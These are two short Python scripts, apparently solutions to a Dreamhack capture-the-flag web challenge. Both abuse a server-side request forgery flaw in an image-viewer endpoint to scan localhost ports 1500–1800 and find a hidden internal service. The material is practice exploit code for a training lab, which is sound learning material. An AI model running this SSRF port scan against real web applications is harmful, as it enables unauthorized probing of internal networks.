#!/usr/bin/python3
import requests
import sys
from tqdm import tqdm
# `src` value of "NOT FOUND X"
NOTFOUND_IMG = "iVBORw0KG"
def send_img(img_url):
    global chall_url
    data = {
        "url": img_url,
    }
    response = requests.post(chall_url, data=data)
    return response.text
def find_port():
    for port in tqdm(range(1500, 1801)):
        img_url = f"http://Localhost:{port}"
        if NOTFOUND_IMG not in send_img(img_url):
            print(f"Internal port number is: {port}")
            break
    return port
if __name__ == "__main__":
    chall_port = int(sys.argv[1])
    chall_url = f"http://host1.dreamhack.games:{chall_port}/img_viewer"
    internal_port = find_port()

----------------------------------------정석 

import requests

queryURL = "http://host1.dreamhack.games:21596/img_viewer"
notFoundImageSignature = "iVBORw0KG"

for portNumber in range(1500, 1800):
    
    payload = "http://Localhost:" + str(portNumber)

    data = {'url' : payload}

    response = requests.post(queryURL, data = data)

    print(f"Now try {portNumber}... {1800 - portNumber} trial remained as maximum projection.")

    if notFoundImageSignature not in response.text:
        print(f"found a port ------> {portNumber} <-------- YEAH!!!!!")
        break

---------------------------------------------------------------참고용 
